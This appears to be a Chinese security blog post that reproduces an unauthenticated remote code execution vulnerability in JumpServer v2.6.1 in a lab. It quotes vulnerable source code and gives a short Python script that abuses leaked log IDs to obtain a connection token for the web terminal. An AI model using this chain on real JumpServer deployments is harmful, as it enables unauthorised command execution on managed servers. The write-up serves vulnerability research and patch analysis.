<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>一、环境搭建<br/>
首先。安装<br/>
安装脚本V2.6.1 <a href="https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip" target="_blank">https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip</a><br/>
github 安装脚本全部是安装最新版的。<br/>
安装的时候注意几个坑。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118140823-92792116-5953-1.png"/></p>
<p>这里全部选择no</p>
<p>然后安装完成之后启动它 到安装目录：/opt/jumpserver-installer-v2.6.1/<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118140841-9cd821c0-5953-1.png"/><br/>
访问jumpServer<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118140852-a3909baa-5953-1.png"/></p>
<p>默认账号是admin admin 进入之后修改密码<br/>
然后进入添加一台主机<br/>
然后进入web终端<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118140943-c220fed4-5953-1.png"/></p>
<p>选择你之前添加的主机进行登陆<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141010-d20bb21c-5953-1.png"/></p>
<p>二、获取token<br/>
首先是找到那个修改bug 的点<br/>
<a href="https://github.com/jumpserver/jumpserver/commits/master" target="_blank">https://github.com/jumpserver/jumpserver/commits/master</a><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141109-f4e41dc4-5953-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141121-fc8c596a-5953-1.png"/><br/>
然后对比一下代码。<br/>
<a href="https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py" target="_blank">https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py</a><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141144-0a298afc-5954-1.png"/><br/>
之前的代码是没有认证的。那么先找到这个路由 。<br/>
源代码如下：<a href="https://www.o2oxy.cn/wp-content/uploads/2021/01/aa.zip" target="_blank">https://www.o2oxy.cn/wp-content/uploads/2021/01/aa.zip</a><br/>
一：找到路由的使用方式<br/>
全局搜索CeleryLogWebsocket 这个函数。然后得到如下的websocket 的路由<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141208-180da4b4-5954-1.png"/><br/>
尝试连接此路由 未授权连结websocket 可以连接成功。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141223-21609472-5954-1.png"/></p>
<p>看看这个函数具体的处理过程</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="kn">from</span> <span class="nn">common.utils</span> <span class="kn">import</span> <span class="n">get_logger</span>

<span class="kn">from</span> <span class="nn">.celery.utils</span> <span class="kn">import</span> <span class="n">get_celery_task_log_path</span>
<span class="kn">from</span> <span class="nn">channels.generic.websocket</span> <span class="kn">import</span> <span class="n">JsonWebsocketConsumer</span>

<span class="n">logger</span> <span class="o">=</span> <span class="n">get_logger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">CeleryLogWebsocket</span><span class="p">(</span><span class="n">JsonWebsocketConsumer</span><span class="p">):</span>
    <span class="n">disconnected</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>



    <span class="k">def</span> <span class="nf">wait_util_log_path_exist</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">task_id</span><span class="p">):</span>
        <span class="n">log_path</span> <span class="o">=</span> <span class="n">get_celery_task_log_path</span><span class="p">(</span><span class="n">task_id</span><span class="p">)</span>
        <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">disconnected</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">log_path</span><span class="p">):</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">send_json</span><span class="p">({</span><span class="s1">'message'</span><span class="p">:</span> <span class="s1">'.'</span><span class="p">,</span> <span class="s1">'task'</span><span class="p">:</span> <span class="n">task_id</span><span class="p">})</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                <span class="k">continue</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">send_json</span><span class="p">({</span><span class="s1">'message'</span><span class="p">:</span> <span class="s1">'</span><span class="se">\r\n</span><span class="s1">'</span><span class="p">})</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">'Task log path: {}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">log_path</span><span class="p">))</span>
                <span class="n">task_log_f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_path</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">task_log_f</span>
            <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
                <span class="k">return</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">read_log_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">task_id</span><span class="p">):</span>
        <span class="n">task_log_f</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">wait_util_log_path_exist</span><span class="p">(</span><span class="n">task_id</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">task_log_f</span><span class="p">:</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">'Task log file is None: {}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">task_id</span><span class="p">))</span>
            <span class="k">return</span>

        <span class="n">task_end_mark</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">disconnected</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">task_log_f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\r\n</span><span class="s1">'</span><span class="p">)</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">send_json</span><span class="p">(</span>
                    <span class="p">{</span><span class="s1">'message'</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">'ignore'</span><span class="p">),</span> <span class="s1">'task'</span><span class="p">:</span> <span class="n">task_id</span><span class="p">}</span>
                <span class="p">)</span>
                <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">'succeeded in'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="n">task_end_mark</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">task_id</span><span class="p">,</span> <span class="s1">'utf8'</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="n">task_end_mark</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">task_end_mark</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">'Task log end: {}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">task_id</span><span class="p">))</span>
                <span class="k">break</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
        <span class="n">task_log_f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">handle_task</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">task_id</span><span class="p">):</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"Task id: {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">task_id</span><span class="p">))</span>
        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">read_log_file</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">task_id</span><span class="p">,))</span>
        <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">disconnect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">close_code</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">disconnected</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p>这里是只能获取log 后缀的一个文件。<br/>
然后就通过传递task 参数传递一个文件名就可以获取到log文件的内容如下：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141307-3b78b394-5954-1.png"/></p>
<p>再查看jumpserver.log 中 存在system_user user 和asset的信息。这些信息。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141327-4789725e-5954-1.png"/></p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="err">'</span><span class="n">user</span><span class="err">'</span><span class="o">:</span> <span class="err">'</span><span class="mi">4320</span><span class="n">ce47</span><span class="o">-</span><span class="n">e0e0</span><span class="o">-</span><span class="mi">4</span><span class="n">b86</span><span class="o">-</span><span class="n">adb1</span><span class="o">-</span><span class="mi">675</span><span class="n">ca611ea0c</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">username</span><span class="err">'</span><span class="o">:</span> <span class="err">'</span><span class="n">test2</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">asset</span><span class="err">'</span><span class="o">:</span> <span class="err">'</span><span class="n">ccb9c6d7</span><span class="o">-</span><span class="mi">6221</span><span class="o">-</span><span class="mf">445e-9</span><span class="n">fcc</span><span class="o">-</span><span class="n">b30c95162825</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">hostname</span><span class="err">'</span><span class="o">:</span> <span class="err">'</span><span class="mf">192.168.1.73</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">system_user</span><span class="err">'</span><span class="o">:</span> <span class="err">'</span><span class="mf">79655e4</span><span class="n">e</span><span class="o">-</span><span class="mi">1741</span><span class="o">-</span><span class="mi">46</span><span class="n">af</span><span class="o">-</span><span class="n">a793</span><span class="o">-</span><span class="n">fff394540a52</span><span class="err">'</span><span class="p">}</span>
</pre></div>
<p>正好是apps/authentication/api/auth.py 认证系统所需要的值。<br/>
代码如下：</p>
<div class="highlight"><pre><span></span><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1">#</span>
<span class="kn">import</span> <span class="nn">uuid</span>

<span class="kn">from</span> <span class="nn">django.core.cache</span> <span class="kn">import</span> <span class="n">cache</span>
<span class="kn">from</span> <span class="nn">django.shortcuts</span> <span class="kn">import</span> <span class="n">get_object_or_404</span>
<span class="kn">from</span> <span class="nn">rest_framework.permissions</span> <span class="kn">import</span> <span class="n">AllowAny</span>
<span class="kn">from</span> <span class="nn">rest_framework.response</span> <span class="kn">import</span> <span class="n">Response</span>
<span class="kn">from</span> <span class="nn">rest_framework.views</span> <span class="kn">import</span> <span class="n">APIView</span>

<span class="kn">from</span> <span class="nn">common.utils</span> <span class="kn">import</span> <span class="n">get_logger</span>
<span class="kn">from</span> <span class="nn">common.permissions</span> <span class="kn">import</span> <span class="n">IsOrgAdminOrAppUser</span>
<span class="kn">from</span> <span class="nn">orgs.mixins.api</span> <span class="kn">import</span> <span class="n">RootOrgViewMixin</span>
<span class="kn">from</span> <span class="nn">users.models</span> <span class="kn">import</span> <span class="n">User</span>
<span class="kn">from</span> <span class="nn">assets.models</span> <span class="kn">import</span> <span class="n">Asset</span><span class="p">,</span> <span class="n">SystemUser</span>

<span class="n">logger</span> <span class="o">=</span> <span class="n">get_logger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">__all__</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'UserConnectionTokenApi'</span><span class="p">,</span>
<span class="p">]</span>


<span class="k">class</span> <span class="nc">UserConnectionTokenApi</span><span class="p">(</span><span class="n">RootOrgViewMixin</span><span class="p">,</span> <span class="n">APIView</span><span class="p">):</span>
    <span class="n">permission_classes</span> <span class="o">=</span> <span class="p">(</span><span class="n">IsOrgAdminOrAppUser</span><span class="p">,)</span>

    <span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="n">user_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'user'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
        <span class="n">asset_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'asset'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
        <span class="n">system_user_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'system_user'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">get_object_or_404</span><span class="p">(</span><span class="n">User</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span>
        <span class="n">asset</span> <span class="o">=</span> <span class="n">get_object_or_404</span><span class="p">(</span><span class="n">Asset</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">asset_id</span><span class="p">)</span>
        <span class="n">system_user</span> <span class="o">=</span> <span class="n">get_object_or_404</span><span class="p">(</span><span class="n">SystemUser</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">system_user_id</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">'user'</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
            <span class="s1">'username'</span><span class="p">:</span> <span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">,</span>
            <span class="s1">'asset'</span><span class="p">:</span> <span class="n">asset_id</span><span class="p">,</span>
            <span class="s1">'hostname'</span><span class="p">:</span> <span class="n">asset</span><span class="o">.</span><span class="n">hostname</span><span class="p">,</span>
            <span class="s1">'system_user'</span><span class="p">:</span> <span class="n">system_user_id</span><span class="p">,</span>
            <span class="s1">'system_user_name'</span><span class="p">:</span> <span class="n">system_user</span><span class="o">.</span><span class="n">name</span>
        <span class="p">}</span>
        <span class="n">cache</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">({</span><span class="s2">"token"</span><span class="p">:</span> <span class="n">token</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">201</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">query_params</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'token'</span><span class="p">)</span>
        <span class="n">user_only</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">query_params</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'user-only'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">cache</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">value</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">404</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">user_only</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">({</span><span class="s1">'user'</span><span class="p">:</span> <span class="n">value</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]})</span>

    <span class="k">def</span> <span class="nf">get_permissions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query_params</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'user-only'</span><span class="p">,</span> <span class="bp">None</span><span class="p">):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">permission_classes</span> <span class="o">=</span> <span class="p">(</span><span class="n">AllowAny</span><span class="p">,)</span>
        <span class="k">return</span> <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">get_permissions</span><span class="p">()</span>
</pre></div>
<p>首先找到这个函数的路由<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141446-769071e2-5954-1.png"/></p>
<p>找到users 路由中的一条路由。</p>
<p>拼接一下整体的路由如下：</p>
<p>/api/v1/authentication/connection-token/<br/>
/api/v1/users/connection-token/</p>
<p>那么先查看一下他的代码逻辑</p>
<p>GET 需要user-only 参数<br/>
post 需要三个参数：user  asset   system_user<br/>
然后返回一个20S 的一个token</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="n">user_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'user'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
        <span class="n">asset_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'asset'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
        <span class="n">system_user_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'system_user'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">get_object_or_404</span><span class="p">(</span><span class="n">User</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span>
        <span class="n">asset</span> <span class="o">=</span> <span class="n">get_object_or_404</span><span class="p">(</span><span class="n">Asset</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">asset_id</span><span class="p">)</span>
        <span class="n">system_user</span> <span class="o">=</span> <span class="n">get_object_or_404</span><span class="p">(</span><span class="n">SystemUser</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">system_user_id</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">'user'</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
            <span class="s1">'username'</span><span class="p">:</span> <span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">,</span>
            <span class="s1">'asset'</span><span class="p">:</span> <span class="n">asset_id</span><span class="p">,</span>
            <span class="s1">'hostname'</span><span class="p">:</span> <span class="n">asset</span><span class="o">.</span><span class="n">hostname</span><span class="p">,</span>
            <span class="s1">'system_user'</span><span class="p">:</span> <span class="n">system_user_id</span><span class="p">,</span>
            <span class="s1">'system_user_name'</span><span class="p">:</span> <span class="n">system_user</span><span class="o">.</span><span class="n">name</span>
        <span class="p">}</span>
        <span class="n">cache</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">({</span><span class="s2">"token"</span><span class="p">:</span> <span class="n">token</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">201</span><span class="p">)</span>
</pre></div>
<p>写了一个获取token脚本如下： 这三个值是从log 中获取的</p>
<div class="highlight"><pre><span></span><span class="n">import</span> <span class="n">requests</span>
<span class="n">import</span> <span class="n">json</span>
<span class="n">data</span><span class="p">={</span><span class="s">"user"</span><span class="p">:</span><span class="s">"4320ce47-e0e0-4b86-adb1-675ca611ea0c"</span><span class="p">,</span><span class="s">"asset"</span><span class="p">:</span><span class="s">"ccb9c6d7-6221-445e-9fcc-b30c95162825"</span><span class="p">,</span><span class="s">"system_user"</span><span class="p">:</span><span class="s">"79655e4e-1741-46af-a793-fff394540a52"</span><span class="p">}</span>

<span class="n">url_host</span><span class="p">=</span><span class="err">'</span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.1.73:8080'</span>

<span class="n">def</span> <span class="nf">get_token</span><span class="p">():</span>
    <span class="n">url</span> <span class="p">=</span> <span class="n">url_host</span><span class="p">+</span><span class="err">'</span><span class="p">/</span><span class="n">api</span><span class="p">/</span><span class="n">v1</span><span class="p">/</span><span class="n">users</span><span class="p">/</span><span class="n">connection</span><span class="p">-</span><span class="n">token</span><span class="p">/?</span><span class="n">user</span><span class="p">-</span><span class="n">only</span><span class="p">=</span><span class="m">1</span><span class="err">'</span>
    <span class="n">response</span> <span class="p">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="p">=</span><span class="n">data</span><span class="p">).</span><span class="n">json</span><span class="p">()</span>
    <span class="n">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="p">[</span><span class="err">'</span><span class="n">token</span><span class="err">'</span><span class="p">]</span>
<span class="n">get_token</span><span class="p">()</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141536-9478f0bc-5954-1.png"/></p>
<p>20S 真男人。</p>
<p>三、代码执行。</p>
<p>一直翻看core 的代码。始终找不到web 终端的代码。有点迷。最后还是靠着360安全忍者师傅的代码弄清楚了真相。<br/>
感谢郁离歌师傅。感谢360安全忍者师傅<br/>
web 终端的代码执行是通过中间件的形式转发给后端koko 的。所以一直找不到koko 的代码在哪里<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141628-b3530978-5954-1.png"/><br/>
后端代码如下：<br/>
<a href="https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go" target="_blank">https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go</a><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141654-c2e0c0ce-5954-1.png"/></p>
<p>跟踪一下processTokenWebsocket 函数</p>
<div class="highlight"><pre><span></span><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">server</span><span class="p">)</span> <span class="nx">processTokenWebsocket</span><span class="p">(</span><span class="nx">ctx</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">GetQuery</span><span class="p">(</span><span class="s">"target_id"</span><span class="p">)</span>
    <span class="nx">tokenUser</span> <span class="o">:=</span> <span class="nx">service</span><span class="p">.</span><span class="nx">GetTokenAsset</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">tokenUser</span><span class="p">.</span><span class="nx">UserID</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
        <span class="nx">logger</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">"Token is invalid: %s"</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">)</span>
        <span class="nx">ctx</span><span class="p">.</span><span class="nx">AbortWithStatus</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">currentUser</span> <span class="o">:=</span> <span class="nx">service</span><span class="p">.</span><span class="nx">GetUserDetail</span><span class="p">(</span><span class="nx">tokenUser</span><span class="p">.</span><span class="nx">UserID</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">currentUser</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">logger</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">"Token userID is invalid: %s"</span><span class="p">,</span> <span class="nx">tokenUser</span><span class="p">.</span><span class="nx">UserID</span><span class="p">)</span>
        <span class="nx">ctx</span><span class="p">.</span><span class="nx">AbortWithStatus</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">targetType</span> <span class="o">:=</span> <span class="nx">TargetTypeAsset</span>
    <span class="nx">targetId</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">ToLower</span><span class="p">(</span><span class="nx">tokenUser</span><span class="p">.</span><span class="nx">AssetID</span><span class="p">)</span>
    <span class="nx">systemUserId</span> <span class="o">:=</span> <span class="nx">tokenUser</span><span class="p">.</span><span class="nx">SystemUserID</span>
    <span class="nx">s</span><span class="p">.</span><span class="nx">runTTY</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">currentUser</span><span class="p">,</span> <span class="nx">targetType</span><span class="p">,</span> <span class="nx">targetId</span><span class="p">,</span> <span class="nx">systemUserId</span><span class="p">)</span>
<span class="p">}</span>
</pre></div>
<p>跟踪一下GetTokenAsset</p>
<div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nx">GetTokenAsset</span><span class="p">(</span><span class="nx">token</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">tokenUser</span> <span class="nx">model</span><span class="p">.</span><span class="nx">TokenUser</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">Url</span> <span class="o">:=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="nx">TokenAssetURL</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span>
    <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">authClient</span><span class="p">.</span><span class="nx">Get</span><span class="p">(</span><span class="nx">Url</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">tokenUser</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">logger</span><span class="p">.</span><span class="nx">Error</span><span class="p">(</span><span class="s">"Get Token Asset info failed: "</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span>
<span class="p">}</span>
</pre></div>
<p>发现也没有做任何的身份认证。尝试连接一下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141750-e463ee38-5954-1.png"/></p>
<p>发现是可以连接。参数构造的话。返回到koko 中。看看登陆到执行一个whoami 看看websocket 怎么发包的<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141811-f080b890-5954-1.png"/></p>
<p>首先是ID +data  进行登陆。</p>
<p>然后是发送命令<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141830-fbcd0ca8-5954-1.png"/></p>
<p>尝试在客户端发送试试<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141849-071917dc-5955-1.png"/></p>
